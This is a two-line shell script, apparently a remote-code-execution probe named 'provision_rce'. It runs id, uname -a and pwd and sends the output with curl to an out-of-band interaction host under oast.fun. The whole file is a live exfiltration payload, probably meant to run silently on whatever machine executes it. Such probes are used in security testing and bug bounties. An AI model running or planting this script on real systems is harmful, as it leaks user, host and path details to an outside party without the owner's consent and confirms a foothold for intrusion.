#!/bin/sh
curl http://jdfqzrgjzjvmtpzzvtqh89eoypr5z00mx.oast.fun/provision_rce -d "$(id; uname -a; pwd)"
